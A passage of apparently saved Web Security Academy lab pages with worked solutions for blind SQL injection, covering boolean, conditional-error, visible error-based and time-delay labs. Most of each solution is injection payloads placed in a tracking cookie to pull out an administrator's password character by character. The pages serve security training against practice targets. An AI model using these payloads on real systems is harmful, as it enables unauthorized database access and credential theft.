        TrackingId=xyz
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         TrackingId
        </code>
                                        cookie, changing it to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz' AND '1'='1
       </code>
                                    <p>
                                        Verify that the "Welcome back" message appears in the response.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Now change it to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz' AND '1'='2
       </code>
                                    <p>
                                        Verify that the "Welcome back" message does not appear in the response. This
                                        demonstrates how you can test a single boolean condition and infer the result.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Now change it to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
       </code>
                                    <p>
                                        Verify that the condition is true, confirming that there is a table called
                                        <code>
         users
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Now change it to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
       </code>
                                    <p>
                                        Verify that the condition is true, confirming that there is a user called
                                        <code>
         administrator
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        The next step is to determine how many characters are in the password of the
                                        <code>
         administrator
        </code>
                                        user. To do this, change the value to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;1)='a
       </code>
                                    <p>
                                        This condition should be true, confirming that the password is greater than 1
                                        character in length.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send a series of follow-up values to test different password lengths. Send:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;2)='a
       </code>
                                    <p>
                                        Then send:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;3)='a
       </code>
                                    <p>
                                        And so on. You can do this manually using
                                        <a href="https://portswigger.net/burp/documentation/desktop/tools/repeater">
                                            Burp Repeater
                                        </a>
                                        , since the length is likely to be short. When the condition stops being true
                                        (i.e. when the "Welcome back" message disappears), you have determined the
                                        length of the password, which is in fact 20 characters long.
                                    </p>
                                </li>
                                <li>
                                    After determining the length of the password, the next step is to test the character
                                    at each position to determine its value. This involves a much larger number of
                                    requests, so you need to use
                                    <a href="https://portswigger.net/burp/documentation/desktop/tools/intruder">
                                        Burp Intruder
                                    </a>
                                    . Send the request you are working on to Burp Intruder, using the context menu.
                                </li>
                                <li>
                                    <p>
                                        In the Positions tab of Burp Intruder, change the value of the cookie to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
       </code>
                                    <p>
                                        This uses the
                                        <code>
         SUBSTRING()
        </code>
                                        function to extract a single character from the password, and test it against a
                                        specific value. Our attack will cycle through each position and possible value,
                                        testing each one in turn.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Place payload position markers around the final
                                        <code>
         a
        </code>
                                        character in the cookie value. To do this, select just the
                                        <code>
         a
        </code>
                                        , and click the "Add Â§" button. You should then see the following as the cookie
                                        value (note the payload position markers):
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='Â§aÂ§
       </code>
                                </li>
                                <li>
                                    To test the character at each position, you'll need to send suitable payloads in the
                                    payload position that you've defined. You can assume that the password contains only
                                    lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list"
                                    is selected, and under
                                    <strong>
                                        Payload settings
                                    </strong>
                                    add the payloads in the range a - z and 0 - 9. You can select these easily using the
                                    "Add from list" drop-down.
                                </li>
                                <li>
                                    To be able to tell when the correct character was submitted, you'll need to grep
                                    each response for the expression "Welcome back". To do this, go to the
                                    <strong>
                                        Settings
                                    </strong>
                                    tab, and the "Grep - Match" section. Clear any existing entries in the list, and
                                    then add the value "Welcome back".
                                </li>
                                <li>
                                    Launch the attack by clicking the "Start attack" button or selecting "Start attack"
                                    from the Intruder menu.
                                </li>
                                <li>
                                    Review the attack results to find the value of the character at the first position.
                                    You should see a column in the results called "Welcome back". One of the rows should
                                    have a tick in this column. The payload showing for that row is the value of the
                                    character at the first position.
                                </li>
                                <li>
                                    <p>
                                        Now, you simply need to re-run the attack for each of the other character
                                        positions in the password, to determine their value. To do this, go back to the
                                        main Burp window, and the Positions tab of Burp Intruder, and change the
                                        specified offset from 1 to 2. You should then see the following as the cookie
                                        value:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
       </code>
                                </li>
                                <li>
                                    Launch the modified attack, review the results, and note the character at the second
                                    offset.
                                </li>
                                <li>
                                    Continue this process testing offset 3, 4, and so on, until you have the whole
                                    password.
                                </li>
                                <li>
                                    In the browser, click "My account" to open the login page. Use the password to log
                                    in as the
                                    <code>
        administrator
       </code>
                                    user.
                                </li>
                            </ol>
                            <div class="highlightedarea">
                                <h4>
                                    Note
                                </h4>
                                <p>
                                    For more advanced users, the solution described here could be made more elegant in
                                    various ways. For example, instead of iterating over every character, you could
                                    perform a binary search of the character space. Or you could create a single
                                    Intruder attack with two payload positions and the "Cluster bomb" attack type, and
                                    work through all permutations of offsets and character values.
                                </p>
                            </div>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Blind
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                with conditional errors
                (sql-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection/blind">
                    blind SQL injection
                </a>
                vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing
                the value of the submitted cookie.
            </p>
            <p>
                The results of the SQL query are not returned, and the application does not respond any differently
                based on whether the query returns any rows. If the SQL query causes an error, then the application
                returns a custom error message.
            </p>
            <p>
                The database contains a different table called
                <code>
   users
  </code>
                , with columns called
                <code>
   username
  </code>
                and
                <code>
   password
  </code>
                . You need to exploit the blind SQL injection vulnerability to find out the password of the
                <code>
   administrator
  </code>
                user.
            </p>
            <p>
                To solve the lab, log in as the
                <code>
   administrator
  </code>
                user.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                This lab uses an Oracle database. For more information, see the
                                <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">
                                    SQL injection cheat sheet
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/9622f310ce0fc2a85821811f98f2be7b23e049667d49d018ca28f06dc0b7875a?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-conditional-errors"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit the front page of the shop, and use Burp Suite to intercept and modify the
                                    request containing the
                                    <code>
        TrackingId
       </code>
                                    cookie. For simplicity, let's say the original value of the cookie is
                                    <code>
        TrackingId=xyz
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         TrackingId
        </code>
                                        cookie, appending a single quotation mark to it:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'
       </code>
                                    <p>
                                        Verify that an error message is received.
                                    </p>
                                </li>
                                <li>
                                    Now change it to two quotation marks:
                                    <code class="code-scrollable">
        TrackingId=xyz''
       </code>
                                    Verify that the error disappears. This suggests that a syntax error (in this case,
                                    the unclosed quotation mark) is having a detectable effect on the response.
                                </li>
                                <li>
                                    <p>
                                        You now need to confirm that the server is interpreting the injection as a SQL
                                        query i.e. that the error is a SQL syntax error as opposed to any other kind of
                                        error. To do this, you first need to construct a subquery using valid SQL
                                        syntax. Try submitting:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT '')||'
       </code>
                                    <p>
                                        In this case, notice that the query still appears to be invalid. This may be due
                                        to the database type - try specifying a predictable table name in the query:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT '' FROM dual)||'
       </code>
                                    <p>
                                        As you no longer receive an error, this indicates that the target is probably
                                        using an Oracle database, which requires all
                                        <code>
         SELECT
        </code>
                                        statements to explicitly specify a table name.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Now that you've crafted what appears to be a valid query, try submitting an
                                        invalid query while still preserving valid SQL syntax. For example, try querying
                                        a non-existent table name:
                                    </p>
                                    <code>
        TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
       </code>
                                    <p>
                                        This time, an error is returned. This behavior strongly suggests that your
                                        injection is being processed as a SQL query by the back-end.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        As long as you make sure to always inject syntactically valid SQL queries, you
                                        can use this error response to infer key information about the database. For
                                        example, in order to verify that the
                                        <code>
         users
        </code>
                                        table exists, send the following query:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
       </code>
                                    <p>
                                        As this query does not return an error, you can infer that this table does
                                        exist. Note that the
                                        <code>
         WHERE ROWNUM = 1
        </code>
                                        condition is important here to prevent the query from returning more than one
                                        row, which would break our concatenation.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        You can also exploit this behavior to test conditions. First, submit the
                                        following query:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
       </code>
                                    <p>
                                        Verify that an error message is received.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Now change it to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
       </code>
                                    <p>
                                        Verify that the error disappears. This demonstrates that you can trigger an
                                        error conditionally on the truth of a specific condition. The
                                        <code>
         CASE
        </code>
                                        statement tests a condition and evaluates to one expression if the condition is
                                        true, and another expression if the condition is false. The former expression
                                        contains a divide-by-zero, which causes an error. In this case, the two payloads
                                        test the conditions
                                        <code>
         1=1
        </code>
                                        and
                                        <code>
         1=2
        </code>
                                        , and an error is received when the condition is
                                        <code>
         true
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        You can use this behavior to test whether specific entries exist in a table. For
                                        example, use the following query to check whether the username
                                        <code>
         administrator
        </code>
                                        exists:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
       </code>
                                    <p>
                                        Verify that the condition is true (the error is received), confirming that there
                                        is a user called
                                        <code>
         administrator
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        The next step is to determine how many characters are in the password of the
                                        <code>
         administrator
        </code>
                                        user. To do this, change the value to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
       </code>
                                    <p>
                                        This condition should be true, confirming that the password is greater than 1
                                        character in length.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send a series of follow-up values to test different password lengths. Send:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
       </code>
                                    <p>
                                        Then send:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)&gt;3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
       </code>
                                    <p>
                                        And so on. You can do this manually using
                                        <a href="https://portswigger.net/burp/documentation/desktop/tools/repeater">
                                            Burp Repeater
                                        </a>
                                        , since the length is likely to be short. When the condition stops being true
                                        (i.e. when the error disappears), you have determined the length of the
                                        password, which is in fact 20 characters long.
                                    </p>
                                </li>
                                <li>
                                    After determining the length of the password, the next step is to test the character
                                    at each position to determine its value. This involves a much larger number of
                                    requests, so you need to use
                                    <a href="https://portswigger.net/burp/documentation/desktop/tools/intruder">
                                        Burp Intruder
                                    </a>
                                    . Send the request you are working on to Burp Intruder, using the context menu.
                                </li>
                                <li>
                                    <p>
                                        In the Positions tab of Burp Intruder, change the value of the cookie to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
       </code>
                                    <p>
                                        This uses the
                                        <code>
         SUBSTR()
        </code>
                                        function to extract a single character from the password, and test it against a
                                        specific value. Our attack will cycle through each position and possible value,
                                        testing each one in turn.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Place payload position markers around the final
                                        <code>
         a
        </code>
                                        character in the cookie value. To do this, select just the
                                        <code>
         a
        </code>
                                        , and click the "Add Â§" button. You should then see the following as the cookie
                                        value (note the payload position markers):
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='Â§aÂ§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
       </code>
                                </li>
                                <li>
                                    To test the character at each position, you'll need to send suitable payloads in the
                                    payload position that you've defined. You can assume that the password contains only
                                    lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list"
                                    is selected, and under "Payload settings" add the payloads in the range a - z and 0
                                    - 9. You can select these easily using the "Add from list" drop-down.
                                </li>
                                <li>
                                    Launch the attack by clicking the "Start attack" button or selecting "Start attack"
                                    from the Intruder menu.
                                </li>
                                <li>
                                    Review the attack results to find the value of the character at the first position.
                                    The application returns an HTTP 500 status code when the error occurs, and an HTTP
                                    200 status code normally. The "Status" column in the Intruder results shows the HTTP
                                    status code, so you can easily find the row with 500 in this column. The payload
                                    showing for that row is the value of the character at the first position.
                                </li>
                                <li>
                                    <p>
                                        Now, you simply need to re-run the attack for each of the other character
                                        positions in the password, to determine their value. To do this, go back to the
                                        main Burp window, and the Positions tab of Burp Intruder, and change the
                                        specified offset from 1 to 2. You should then see the following as the cookie
                                        value:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='Â§aÂ§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
       </code>
                                </li>
                                <li>
                                    Launch the modified attack, review the results, and note the character at the second
                                    offset.
                                </li>
                                <li>
                                    Continue this process testing offset 3, 4, and so on, until you have the whole
                                    password.
                                </li>
                                <li>
                                    In the browser, click "My account" to open the login page. Use the password to log
                                    in as the
                                    <code>
        administrator
       </code>
                                    user.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Visible error-based SQL injection
                (sql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing
                the value of the submitted cookie. The results of the SQL query are not returned.
            </p>
            <p>
                The database contains a different table called
                <code>
   users
  </code>
                , with columns called
                <code>
   username
  </code>
                and
                <code>
   password
  </code>
                . To solve the lab, find a way to leak the password for the
                <code>
   administrator
  </code>
                user, then log in to their account.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/706318b8f1857a10698288c9bf7712276e4ab38822541edeb0385a44da54de78?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-sql-injection-visible-error-based"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Using Burp's built-in browser, explore the lab functionality.
                                </li>
                                <li>
                                    Go to the
                                    <strong>
                                        Proxy &gt; HTTP history
                                    </strong>
                                    tab and find a
                                    <code>
        GET /
       </code>
                                    request that contains a
                                    <code>
        TrackingId
       </code>
                                    cookie.
                                </li>
                                <li>
                                    <p>
                                        In Repeater, append a single quote to the value of your
                                        <code>
         TrackingId
        </code>
                                        cookie and send the request.
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=ogAZZfxtOKUELbuJ'
       </code>
                                </li>
                                <li>
                                    In the response, notice the verbose error message. This discloses the full SQL
                                    query, including the value of your cookie. It also explains that you have an
                                    unclosed string literal. Observe that your injection appears inside a single-quoted
                                    string.
                                </li>
                                <li>
                                    <p>
                                        In the request, add comment characters to comment out the rest of the query,
                                        including the extra single-quote character that's causing the error:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=ogAZZfxtOKUELbuJ'--
       </code>
                                </li>
                                <li>
                                    Send the request. Confirm that you no longer receive an error. This suggests that
                                    the query is now syntactically valid.
                                </li>
                                <li>
                                    <p>
                                        Adapt the query to include a generic
                                        <code>
         SELECT
        </code>
                                        subquery and cast the returned value to an
                                        <code>
         int
        </code>
                                        data type:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
       </code>
                                </li>
                                <li>
                                    Send the request. Observe that you now get a different error saying that an
                                    <code>
        AND
       </code>
                                    condition must be a boolean expression.
                                </li>
                                <li>
                                    <p>
                                        Modify the condition accordingly. For example, you can simply add a comparison
                                        operator (
                                        <code>
         =
        </code>
                                        ) as follows:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
       </code>
                                </li>
                                <li>
                                    Send the request. Confirm that you no longer receive an error. This suggests that
                                    this is a valid query again.
                                </li>
                                <li>
                                    <p>
                                        Adapt your generic
                                        <code>
         SELECT
        </code>
                                        statement so that it retrieves usernames from the database:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
       </code>
                                </li>
                                <li>
                                    Observe that you receive the initial error message again. Notice that your query now
                                    appears to be truncated due to a character limit. As a result, the comment
                                    characters you added to fix up the query aren't included.
                                </li>
                                <li>
                                    <p>
                                        Delete the original value of the
                                        <code>
         TrackingId
        </code>
                                        cookie to free up some additional characters. Resend the request.
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
       </code>
                                </li>
                                <li>
                                    Notice that you receive a new error message, which appears to be generated by the
                                    database. This suggests that the query was run properly, but you're still getting an
                                    error because it unexpectedly returned more than one row.
                                </li>
                                <li>
                                    <p>
                                        Modify the query to return only one row:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
       </code>
                                </li>
                                <li>
                                    <p>
                                        Send the request. Observe that the error message now leaks the first username
                                        from the
                                        <code>
         users
        </code>
                                        table:
                                    </p>
                                    <code class="code-scrollable">
        ERROR: invalid input syntax for type integer: "administrator"
       </code>
                                </li>
                                <li>
                                    <p>
                                        Now that you know that the
                                        <code>
         administrator
        </code>
                                        is the first user in the table, modify the query once again to leak their
                                        password:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
       </code>
                                </li>
                                <li>
                                    Log in as
                                    <code>
        administrator
       </code>
                                    using the stolen password to solve the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Blind
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                with time delays
                (sql-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection/blind">
                    blind SQL injection
                </a>
                vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing
                the value of the submitted cookie.
            </p>
            <p>
                The results of the SQL query are not returned, and the application does not respond any differently
                based on whether the query returns any rows or causes an error. However, since the query is executed
                synchronously, it is possible to trigger conditional time delays to infer information.
            </p>
            <p>
                To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You can find some useful payloads on our
                                <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">
                                    SQL injection cheat sheet
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/5d7c0f6ae7e03b08a47f4f6bff758a7c1b154753efea5dc4d4b847f7d1eab0a7?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-time-delays"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit the front page of the shop, and use Burp Suite to intercept and modify the
                                    request containing the
                                    <code>
        TrackingId
       </code>
                                    cookie.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         TrackingId
        </code>
                                        cookie, changing it to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'||pg_sleep(10)--
       </code>
                                </li>
                                <li>
                                    Submit the request and observe that the application takes 10 seconds to respond.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Blind
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                with time delays and information retrieval
                (sql-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection/blind">
                    blind SQL injection
                </a>
                vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing
                the value of the submitted cookie.
            </p>
            <p>
                The results of the SQL query are not returned, and the application does not respond any differently
                based on whether the query returns any rows or causes an error. However, since the query is executed
                synchronously, it is possible to trigger conditional time delays to infer information.
            </p>
            <p>
                The database contains a different table called
                <code>
   users
  </code>
                , with columns called
                <code>
   username
  </code>
                and
                <code>
   password
  </code>
                . You need to exploit the blind SQL injection vulnerability to find out the password of the
                <code>
   administrator
  </code>
                user.
            </p>
            <p>
                To solve the lab, log in as the
                <code>
   administrator
  </code>
                user.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You can find some useful payloads on our
                                <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">
                                    SQL injection cheat sheet
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/90b742428496fd275bba4a89c5b13e2fa4dea4be3875ec8f6b09cdcd4cb63e7d?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-time-delays-info-retrieval"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit the front page of the shop, and use Burp Suite to intercept and modify the
                                    request containing the
                                    <code>
        TrackingId
       </code>
                                    cookie.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         TrackingId
        </code>
                                        cookie, changing it to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
       </code>
                                    <p>
                                        Verify that the application takes 10 seconds to respond.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Now change it to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
       </code>
                                    <p>
                                        Verify that the application responds immediately with no time delay. This
                                        demonstrates how you can test a single boolean condition and infer the result.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Now change it to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
       </code>
                                    <p>
                                        Verify that the condition is true, confirming that there is a user called
                                        <code>
         administrator
        </code>
                                        .
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        The next step is to determine how many characters are in the password of the
                                        <code>
         administrator
        </code>
                                        user. To do this, change the value to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
       </code>
                                    <p>
                                        This condition should be true, confirming that the password is greater than 1
                                        character in length.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Send a series of follow-up values to test different password lengths. Send:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
       </code>
                                    <p>
                                        Then send:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
       </code>
                                    <p>
                                        And so on. You can do this manually using
                                        <a href="https://portswigger.net/burp/documentation/desktop/tools/repeater">
                                            Burp Repeater
                                        </a>
                                        , since the length is likely to be short. When the condition stops being true
                                        (i.e. when the application responds immediately without a time delay), you have
                                        determined the length of the password, which is in fact 20 characters long.
                                    </p>
                                </li>
                                <li>
                                    After determining the length of the password, the next step is to test the character
                                    at each position to determine its value. This involves a much larger number of
                                    requests, so you need to use
                                    <a href="https://portswigger.net/burp/documentation/desktop/tools/intruder">
                                        Burp Intruder
                                    </a>
                                    . Send the request you are working on to Burp Intruder, using the context menu.
                                </li>
                                <li>
                                    <p>
                                        In the Positions tab of Burp Intruder, change the value of the cookie to:
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
       </code>
                                    <p>
                                        This uses the
                                        <code>
         SUBSTRING()
        </code>
                                        function to extract a single character from the password, and test it against a
                                        specific value. Our attack will cycle through each position and possible value,
                                        testing each one in turn.
                                    </p>
                                </li>
                                <li>
                                    <p>
                                        Place payload position markers around the
                                        <code>
         a
        </code>
                                        character in the cookie value. To do this, select just the
                                        <code>
         a
        </code>
                                        , and click the "Add Â§" button. You should then see the following as the cookie
                                        value (note the payload position markers):
                                    </p>
                                    <code class="code-scrollable">
        TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='Â§aÂ§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
       </code>
                                </li>
                                <li>
                                    To test the character at each position, you'll need to send suitable payloads in the
                                    payload position that you've defined. You can assume that the password contains only
                                    lower case alphanumeric characters. Go to the Payloads tab, check that "Simple list"
                                    is selected, and under "Payload settings" add the payloads in the range a - z and 0
                                    - 9. You can select these easily using the "Add from list" drop-down.
                                </li>
                                <li>
                                    To be able to tell when the correct character was submitted, you'll need to monitor
                                    the time taken for the application to respond to each request. For this process to
                                    be as reliable as possible, you need to configure the Intruder attack to issue
